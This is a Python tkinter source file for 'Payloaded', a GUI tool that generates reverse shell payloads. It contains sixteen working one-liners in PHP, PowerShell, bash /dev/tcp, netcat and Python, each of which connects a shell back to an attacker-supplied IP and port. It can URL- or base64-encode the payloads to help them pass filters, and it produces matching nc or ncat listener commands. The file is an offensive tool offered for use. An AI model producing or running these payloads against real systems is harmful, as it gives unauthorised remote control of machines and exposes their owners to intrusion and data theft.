# Application name: Payloaded
# Author: Raya Alotaibi
# Date: 07/01/2023


import tkinter as tk
from datetime import datetime
import urllib.parse
import base64
import ipaddress

# Dictionary for payload titles
PAYLOAD_OPTIONS = {
    1: "PHP System",
    2: "PHP Exec",
    3: "PHP Shell_Exec",
    4: "PowerShell #1",
    5: "Bash -i",
    6: "Bash 196",
    7: "Bash read line",
    8: "Bash 5",
    9: "Bash udp",
    10: "nc mkfifo",
    11: "nc -e",
    12: "nc.exe -e",
    13: "nc -c",
    14: "Python #2",
    15: "Python3 #1",
    16: "Python3 #2",
    # add more options if you wish, dont forget to add your payload in the generate_reverse_shell_payload function
    # eg 17: "Bash #2",
}
# Dictionary for encoding titles
ENCODING_OPTIONS = {
    1: "None",
    2: "URL encode",
    3: "Double URL encode",
    4: "Base64",
    # add more options if you wish, dont forget to add your encoding in the generate_reverse_shell_payload function
    # eg 5: "Base32",
}
# Dictionary for listener titles
LISTENER_OPTIONS = {
    1: "nc",
    2: "ncat (TLS)",
    # add more options if you wish, dont forget to add your listener in the generate_payload function
    
}

# Function that maps payload titles to payloads
def generate_reverse_shell_payload(target_system, ip_address, port, encoding):
    if target_system == 1:
        payload = f"php -r '$sock=fsockopen(\"{ip_address}\",{port});system(\"sh <&3 >&3 2>&3\");'"
    elif target_system == 2:
        payload = f"php -r '$sock=fsockopen(\"{ip_address}\",{port});exec(\"sh <&3 >&3 2>&3\");'"
    elif target_system == 3:
        payload = f"php -r '$sock=fsockopen(\"{ip_address}\",{port});shell_exec(\"sh <&3 >&3 2>&3\");'"
    elif target_system == 4:
        payload = f"$LHOST = \"{ip_address}\"; $LPORT = {port}; $TCPClient = New-Object Net.Sockets.TCPClient($LHOST, $LPORT); $NetworkStream = $TCPClient.GetStream(); $StreamReader = New-Object IO.StreamReader($NetworkStream); $StreamWriter = New-Object IO.StreamWriter($NetworkStream); $StreamWriter.AutoFlush = $true; $Buffer = New-Object System.Byte[] 1024; while ($TCPClient.Connected) {{ while ($NetworkStream.DataAvailable) {{ $RawData = $NetworkStream.Read($Buffer, 0, $Buffer.Length); $Code = ([text.encoding]::UTF8).GetString($Buffer, 0, $RawData -1) }}; if ($TCPClient.Connected -and $Code.Length -gt 1) {{ $Output = try {{ Invoke-Expression ($Code) 2>&1 }} catch {{ $_ }}; $StreamWriter.Write(\"$Output`n\"); $Code = $null }} }}; $TCPClient.Close(); $NetworkStream.Close(); $StreamReader.Close(); $StreamWriter.Close()"
    elif target_system == 5:
        payload = f"sh -i >& /dev/tcp/{ip_address}/{port} 0>&1"
    elif target_system == 6:
        payload = f"0<&196;exec 196<>/dev/tcp/{ip_address}/{port}; sh <&196 >&196 2>&196"
    elif target_system == 7:
        payload = f"exec 5<>/dev/tcp/{ip_address}/{port};cat <&5 | while read line; do $line 2>&5 >&5; done"
    elif target_system == 8:
        payload = f"sh -i 5<> /dev/tcp/{ip_address}/{port} 0<&5 1>&5 2>&5"
    elif target_system == 9:
        payload = f"sh -i >& /dev/udp/{ip_address}/{port} 0>&1"
    elif target_system == 10:
        payload = f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc {ip_address} {port} >/tmp/f"
    elif target_system == 11:
        payload = f"nc {ip_address} {port} -e sh"
    elif target_system == 12:
        payload = f"nc.exe {ip_address} {port} -e sh"
    elif target_system == 13:
        payload = f"nc -c sh {ip_address} {port}"
    elif target_system == 14:
        payload = f"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{ip_address}\",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"sh\")'"
    elif target_system == 15:
        payload = f"export RHOST=\"{ip_address}\";export RPORT={port};python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(\"RHOST\"),int(os.getenv(\"RPORT\"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"sh\")'"
    elif target_system == 16:
        payload = f"python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{ip_address}\",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"sh\")'"
    else:
        raise ValueError("Invalid target system")

    if encoding == 2:
        payload = urllib.parse.quote(payload)
    elif encoding == 3:
        payload = urllib.parse.quote(urllib.parse.quote(payload))
    elif encoding == 4:
        payload = base64.b64encode(payload.encode()).decode()

    return payload

def save_payload(payload, filename):
    # fname = "./Payload/" + filename
    fname = filename
    with open(fname, "w") as file:
        file.write(payload)
# Generates text in the text box
def set_text_by_button(sample_text: tk.Text, text: str):
    sample_text.delete(1.0,"end")
    sample_text.insert(1.0, text)
# Copies text in the text box to clipboard
def copy_to_clipboard(root: tk.Tk, text_window: tk.Text) -> None:
    root.clipboard_clear()
    root.clipboard_append(text_window.get(1.0, "end-1c"))
# IP validation
def validate_ip(ip_address: str) -> bool:
    try:
        ipaddress.ip_address(ip_address)
        # all clear
        ip_validity_label.config(text="Valid IP Address", fg="green")
        return True
    except ValueError:
        # Here change label to red
        ip_validity_label.config(text="Invalid IP Address", fg="red")
        return False
# Port validation
def validate_port(port: str) -> bool:
    try:
        port = int(port)
        if port > 0 and port <= 65535:
            port_validity_label.config(text="Valid Port", fg="green")
            return True
        else:
            port_validity_label.config(text="Invalid Port", fg="red")
            return False
    except ValueError:
        # print(port)
        port_validity_label.config(text="Invalid Port", fg="red")
        return False
# Generates payload and listener command
def generate_payload():
    target = payload_option.get() # string value of menu item
    target_system = int(payload_menu['menu'].index(target)) +1 #int key for payload
    ip_address = ip_entry.get()
    
    port = port_entry.get()
    encoding = encoding_option.get() # string value of menu item
    encoding_system = int(encoding_menu['menu'].index(encoding))+1 #int key for encoding
    filename = filename_entry.get()
    filename = "output.txt" if not filename else filename
    payload = generate_reverse_shell_payload(target_system, ip_address, port, encoding_system)
    save_payload(payload, filename)

    # print("Reverse Shell Payload:")
    # print(payload + "\n")

    listener_option_value = listener_option.get()
    listener_command = ""

    if listener_option_value == "nc":
        listener_command = f"nc -lvnp {port}"
    elif listener_option_value == "ncat (TLS)":
        listener_command = f"ncat --ssl -lvnp {port}"
    
    set_text_by_button(listener_text, listener_command)
    set_text_by_button(payload_text, payload)
    
    # print("Listener Command:")
    # print(listener_command + "\n")
    # print(f"Payload saved to {filename}")
    # print("--------")
    return payload, listener_command

# creating window and dropdown objects
root = tk.Tk() # window object
root.title("Automated Payload Generator")
title = tk.Label(root, text="PayLoaded",underline=5,bg="gray",fg="blue", font="none 24 bold italic")

# Configure the window
root.columnconfigure([0,1], minsize=5) # 2 columns
root.rowconfigure([0,1, 2,3,4,5,6], minsize=50) # 7 rows
root.resizable(width=False, height=False)

# Create frames containers
frm_listener = tk.Frame(master=root,  relief=tk.RAISED, borderwidth=1)
# frm_listener.grid(row=0, column=0)
frm_payload = tk.Frame(master=root,  relief=tk.RAISED, borderwidth=1)
# frm_payload.grid(row=1, column=0)
frm_encoding = tk.Frame(master=root,  relief=tk.RAISED, borderwidth=1)
# frm_encoding.grid(row=1, column=1)
frm_ip = tk.Frame(master=root,  relief=tk.RAISED, borderwidth=1)
# frm_ip.grid()
frm_port = tk.Frame(master=root,  relief=tk.RAISED, borderwidth=1)
# frm_port.grid()
frm_file= tk.Frame(master=root,  relief=tk.RAISED, borderwidth=1)
# frm_file.grid()
frm_listener_output = tk.Frame(master=root,  relief=tk.RAISED, borderwidth=1)
# frm_listener_output.grid(column=0, row=5)
frm_payload_output = tk.Frame(master=root,  relief=tk.RAISED, borderwidth=1)
# frm_payload_output.grid(column=1, row=5)

# pack the frames
title.grid(row=0, column=0, columnspan=2, sticky="nsew")
title.grid()
frm_listener.grid(row=1, column=0, columnspan=2, sticky="nsew")
frm_payload.grid(row=2, column=0, sticky="nsew")
frm_encoding.grid(row=2, column=1, sticky="nsew")
frm_ip.grid(row=3, column=0, columnspan=2, sticky="nsew")
frm_port.grid(row=4, column=0, columnspan=2,sticky="nsew")
frm_file.grid(row=5, column=0, columnspan=2,sticky="nsew")
frm_listener_output.grid(row=6, column=0, sticky="nsew")
frm_payload_output.grid(row=6, column=1, sticky="nsew")

# have the elements inside the frames be centered
frm_listener.grid_columnconfigure(0, weight=1)
frm_payload.grid_columnconfigure(0, weight=1)
frm_encoding.grid_columnconfigure(0, weight=1)
frm_ip.grid_columnconfigure(0, weight=1)
frm_port.grid_columnconfigure(0, weight=1)
frm_file.grid_columnconfigure(0, weight=1)
frm_listener_output.grid_columnconfigure(0, weight=1)
frm_payload_output.grid_columnconfigure(0, weight=1)


# variable objects
payload_option = tk.StringVar(frm_payload, name="payload_option")
payload_option.set("PHP System")  # Default payload option

encoding_option = tk.StringVar(frm_encoding, name="encoding_option")
encoding_option.set("None")  # Default encoding option

listener_option = tk.StringVar(frm_listener)
listener_option.set("nc")  # Default listener option


# Listener stuff
listener_label = tk.Label(frm_listener, text="Listener Options:")
listener_label.grid()
listener_menu = tk.OptionMenu(frm_listener, listener_option, *LISTENER_OPTIONS.values())
listener_menu.grid()
listener_title = tk.Label(frm_listener_output, text="Listener Command",bg="blue")
listener_text = tk.Text(frm_listener_output, width=28, height=10)

# Payload stuff
payload_label = tk.Label(frm_payload, text="Payload Options:")
payload_label.grid()
payload_menu = tk.OptionMenu(frm_payload, payload_option, *PAYLOAD_OPTIONS.values())
payload_menu.grid()
payload_title = tk.Label(frm_payload_output, text="Payload Command", bg="blue")
payload_text = tk.Text(frm_payload_output, width=28, height=10)
# Encoding stuff
encoding_label = tk.Label(frm_encoding, text="Encoding Options:")
encoding_label.grid()
encoding_menu = tk.OptionMenu(frm_encoding, encoding_option, *ENCODING_OPTIONS.values())
encoding_menu.grid()


# IP stuff
reg_ip = root.register(validate_ip)
ip_label = tk.Label(frm_ip, text="Attacker's IP address:")
ip_label.grid()
ip_entry = tk.Entry(frm_ip, name="ip_entry",justify="center")
ip_entry.grid()
ip_validity_label = tk.Label(frm_ip)
ip_validity_label.grid()
ip_entry.config(validate ="focusout", validatecommand =(reg_ip, '%P'))


# Port stuff
reg_port = root.register(validate_port)
port_label = tk.Label(frm_port, text="Attacker's port:")
port_label.grid()
port_entry = tk.Entry(frm_port, name="port_entry",justify="center")
port_entry.grid()
port_validity_label = tk.Label(frm_port)
port_validity_label.grid()
port_entry.config(validate ="focusout", validatecommand =(reg_port, '%P'))


# Filename stuff
filename_label = tk.Label(frm_file, text="Filename to save the payload:")
filename_label.grid()
filename_entry = tk.Entry(frm_file, name="filename_entry",justify="center")
filename_entry.grid()
generate_button = tk.Button(frm_file, text="Generate Payload", command=generate_payload)
generate_button.grid()


# Pack outputs finally
listener_title.grid()
listener_text.grid()
copy_listener = tk.Button(frm_listener_output, text="Copy", command=lambda: copy_to_clipboard(root, listener_text))
copy_listener.grid()

payload_title.grid()
payload_text.grid()
copy_payload = tk.Button(frm_payload_output, text="Copy", command=lambda: copy_to_clipboard(root, payload_text))
copy_payload.grid()

root.mainloop() # keeps window open until closed
